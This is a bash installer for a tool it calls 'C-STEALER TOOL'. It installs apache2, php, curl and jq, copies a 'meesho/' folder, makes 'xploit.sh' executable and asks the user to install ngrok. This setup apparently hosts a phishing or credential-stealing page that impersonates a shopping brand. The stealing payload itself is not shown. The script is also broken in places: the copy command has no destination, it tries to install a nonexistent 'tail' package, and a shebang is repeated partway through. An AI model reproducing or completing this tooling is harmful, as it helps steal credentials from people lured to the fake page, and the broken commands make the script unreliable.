#! /usr/bin/env bash
RED="31"
GREEN="32"
BOLDGREEN="\e[1;${GREEN}m"
ITALICRED="\e[3;${RED}m"
ENDCOLOR="\e[0m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
MAGENTA="\e[35m"
RED="\e[41m"
WHITE="\e[97m"
BLACK="\e[30m"
BOLDCYAN="\e[36m"
echo""
#!/bin/bash
echo ""
clear
echo ""
echo ""
echo -e $'\e[1;33m   ஜ۩۞۩ஜ C-STEALER TOOL ஜ۩۞۩ஜ   Installing Please wait... \e[0m'
sleep 8
clear
echo ""
echo ""
echo ""
read -p $'\e[0m\e[1;32m To Install TYPE \e[1;33m"Y"\e[1;32m PRESS \e[1;33m"ENTER"  \e[1;36m💟 Thank You 💟\e[1;33m     (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m  Downloading Requirements \e[0m'
apt update
apt upgrade
apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
clear

cp -R meesho/

chmod 7777 xploit.sh
clear
echo ""
echo ""
echo ""
read -p $'\e[1;33m↪↪↪↪↪↪↪↪↪↪↪↪↪↪\e[0m\e[1;32m  Install Ngrok Manually [Install Ngrok ]\e[1;33m ↩↩↩↩↩↩↩↩↩↩↩↩↩: \e[0m'
clear
